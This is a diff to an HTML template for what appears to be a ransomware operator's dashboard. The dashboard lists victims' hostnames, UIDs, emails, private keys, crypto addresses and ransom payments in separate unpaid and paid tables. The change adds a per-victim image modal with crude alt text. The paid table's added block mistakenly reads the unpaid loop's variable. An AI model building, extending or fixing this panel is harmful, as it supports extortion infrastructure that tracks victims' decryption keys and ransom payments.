@@ -39,6 +39,7 @@
                     <th class="wide-col">Hostname</th>
                     <th class="wide-col">UID</th>
                     <th class="wide-col">Email</th>
+                    <th class="wide-col">Image</th>
                     <th class="wide-col">Private Key</th>
                     <th class="wide-col">Crypto Address</th>
                     <th class="wide-col">Total Payment</th>
@@ -56,6 +57,33 @@
                         <td class="wide-col">{{ user.hostname }}</td>
                         <td class="wide-col uid-cell">{{ user.uid }}</td>
                         <td class="wide-col">{{ user.email }}</td>
+                        <td class="wide-col">
+                            <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#imageModal{{ loop.index }}">
+                                View Image
+                            </button>
+                            <!-- The Modal -->
+                            <div class="modal fade" id="imageModal{{ loop.index }}">
+                                <div class="modal-dialog modal-xl modal-dialog-centered"> <!-- Added the modal-dialog-centered class -->
+                                    <div class="modal-content">
+
+                                        <!-- Modal Header -->
+                                        <div class="modal-header">
+                                            <h4 class="modal-title">View Image</h4>
+                                            <button type="button" class="close" data-dismiss="modal">&times;</button>
+                                        </div>
+
+                                        <!-- Modal body -->
+                                        <div class="modal-body">
+                                            {% if user.image %}
+                                            <img src="data:image/png;base64,{{ user.image|b64encode }}" class="img-fluid w-100 h-100" alt="Pussy Image">
+                                            {% endif %}
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </td>
+
                         <td>
                             <div class="scrollable-cell">
                                 {{ user.private_key }}
@@ -89,6 +117,7 @@
                     <th class="wide-col">Hostname</th>
                     <th class="wide-col">UID</th>
                     <th class="wide-col">Email</th>
+                    <th class="wide-col">Image</th>
                     <th class="wide-col">Private Key</th>
                     <th class="wide-col">Crypto Address</th>
                     <th class="wide-col">Total Payment</th>
@@ -106,6 +135,32 @@
                         <td class="wide-col">{{ user_paid.hostname }}</td>
                         <td class="wide-col uid-cell">{{ user_paid.uid }}</td>
                         <td class="wide-col">{{ user_paid.email }}</td>
+                        <td class="wide-col">
+                            <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#imageModal{{ loop.index }}">
+                                View Image
+                            </button>
+                            <!-- The Modal -->
+                            <div class="modal fade" id="imageModal{{ loop.index }}">
+                                <div class="modal-dialog modal-xl modal-dialog-centered"> <!-- Added the modal-dialog-centered class -->
+                                    <div class="modal-content">
+
+                                        <!-- Modal Header -->
+                                        <div class="modal-header">
+                                            <h4 class="modal-title">View Image</h4>
+                                            <button type="button" class="close" data-dismiss="modal">&times;</button>
+                                        </div>
+
+                                        <!-- Modal body -->
+                                        <div class="modal-body">
+                                            {% if user.image %}
+                                            <img src="data:image/png;base64,{{ user.image|b64encode }}" class="img-fluid w-100 h-100" alt="Pussy Image">
+                                            {% endif %}
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </td>
                         <td>
                             <div class="scrollable-cell">
                                 {{ user_paid.private_key }}
